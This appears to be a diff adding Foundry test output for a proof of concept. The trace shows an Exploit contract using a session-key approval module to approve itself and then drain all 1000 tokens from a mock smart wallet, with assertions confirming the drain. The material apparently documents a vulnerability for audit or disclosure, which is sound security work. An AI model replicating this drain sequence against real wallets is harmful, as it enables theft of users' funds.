@@ -1,0 +1,59 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/62847-c-01-sessionkey-owner-drain-smart-wallet_exp.sol:PoC_62847
+[PASS] test_session_owner_can_drain_unlocked_wallet_tokens() (gas: 1412412)
+Traces:
+  [1452212] PoC_62847::test_session_owner_can_drain_unlocked_wallet_tokens()
+    ├─ [1306308] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [425059] → new WalletToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 2123 bytes of code
+    │   ├─ [83327] → new CredibleAccountModule@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 416 bytes of code
+    │   ├─ [218261] → new SmartWallet@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   └─ ← [Return] 1090 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 2: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 2079 bytes of code
+    ├─ [102941] Exploit::run()
+    │   ├─ [23039] WalletToken::mint(SmartWallet: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 1000)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xdc168c35dff6d4bc573a93840ae1ecb3ee12fd9d64a52f0b58cdf0e7d3f24462: 0 → 1000
+    │   │   └─ ← [Stop]
+    │   ├─ [26613] SmartWallet::executeApprove(CredibleAccountModule: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], WalletToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000)
+    │   │   ├─ [795] CredibleAccountModule::validateApproval(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000) [staticcall]
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [23084] WalletToken::approve(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb98f72d2897f433c9802f78d62b8a63cec1728fac5e1afdd63b3753af949d0aa: 0 → 1000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [25028] WalletToken::transferFrom(SmartWallet: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb98f72d2897f433c9802f78d62b8a63cec1728fac5e1afdd63b3753af949d0aa: 1000 → 0
+    │   │   │   @ 0xdc168c35dff6d4bc573a93840ae1ecb3ee12fd9d64a52f0b58cdf0e7d3f24462: 1000 → 0
+    │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 1000
+    │   │   └─ ← [Return] true
+    │   ├─ [845] WalletToken::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1000
+    │   ├─  storage changes:
+    │   │   @ 3: 0 → 1000
+    │   └─ ← [Stop]
+    ├─ [425] Exploit::drained() [staticcall]
+    │   └─ ← [Return] 1000
+    ├─ [0] VM::assertEq(1000, 1000) [staticcall]
+    │   └─ ← [Return]
+    ├─ [747] Exploit::token() [staticcall]
+    │   └─ ← [Return] WalletToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [660] Exploit::wallet() [staticcall]
+    │   └─ ← [Return] SmartWallet: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]
+    ├─ [845] WalletToken::balanceOf(SmartWallet: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 626.62µs (413.25µs CPU time)
+
+Ran 1 test suite in 25.63ms (626.62µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
